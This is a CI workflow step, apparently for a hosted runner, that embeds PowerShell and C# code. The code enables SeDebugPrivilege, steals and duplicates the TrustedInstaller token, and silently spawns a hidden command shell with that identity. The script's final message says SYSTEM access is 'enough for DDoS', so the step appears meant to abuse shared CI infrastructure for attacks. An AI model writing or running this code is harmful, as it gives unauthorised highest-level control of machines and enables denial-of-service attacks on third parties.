- name: Spawn TrustedInstaller Shell
  run: |
    # Ensure TrustedInstaller service is running
    Start-Service TrustedInstaller -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3

    # Get PID
    $proc = Get-Process -Name TrustedInstaller -ErrorAction SilentlyContinue
    if (-not $proc) {
      Write-Host "TrustedInstaller not running – skipping TI step."
      exit 0
    }
    $tiPid = $proc[0].Id

    # C# with privilege enabling and fallback logic
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    using System.Security.Principal;

    public class TI
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint SE_PRIVILEGE_ENABLED = 0x2;
        const uint TOKEN_PRIVILEGE = 0x0020;

        public static void EnableDebugPrivilege()
        {
            IntPtr hToken;
            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
                throw new Exception("Failed to open self token.");

            LUID luid;
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
                throw new Exception("LookupPrivilegeValue failed.");

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privileges.Luid = luid;
            tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                throw new Exception("AdjustTokenPrivileges failed.");
        }

        public static void Spawn(uint pid)
        {
            // Enable SeDebugPrivilege first
            try { EnableDebugPrivilege(); } catch { /* ignored */ }

            // Try to open with QUERY_LIMITED first (works on protected processes)
            IntPtr hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
            if (hProc == IntPtr.Zero)
            {
                // Fallback to QUERY_INFORMATION
                hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
                if (hProc == IntPtr.Zero)
                    throw new Exception("OpenProcess failed with both access masks.");
            }

            // Try to open token with QUERY | DUPLICATE
            IntPtr hToken;
            if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken))
                throw new Exception("OpenProcessToken failed.");

            IntPtr hDupToken;
            if (!DuplicateTokenEx(hToken, 0x1F0FFF, IntPtr.Zero, 2, 1, out hDupToken))
                throw new Exception("DuplicateTokenEx failed.");

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;
            uint flags = 0x08000000; // CREATE_NO_WINDOW

            string cmdLine = "/c whoami > C:\\ti_proof.txt & echo TI ACTIVE >> C:\\ti_proof.txt & cmd.exe /k";
            bool success = CreateProcessAsUser(
                hDupToken,
                "C:\\Windows\\System32\\cmd.exe",
                cmdLine,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                flags,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );
            if (!success) throw new Exception("CreateProcessAsUser failed.");
        }
    }
    "@ -ReferencedAssemblies @(
        [System.Runtime.InteropServices.Marshal].Assembly.Location,
        [System.Security.Principal.WindowsIdentity].Assembly.Location
    )

    # Call with the PID we obtained
    try {
        [TI]::Spawn($tiPid)
        Write-Host "TrustedInstaller shell spawned. Check C:\ti_proof.txt"
    } catch {
        Write-Host "TrustedInstaller spawn failed: $_"
        Write-Host "But that's OK – you already have SYSTEM, which is enough for DDoS."
    }
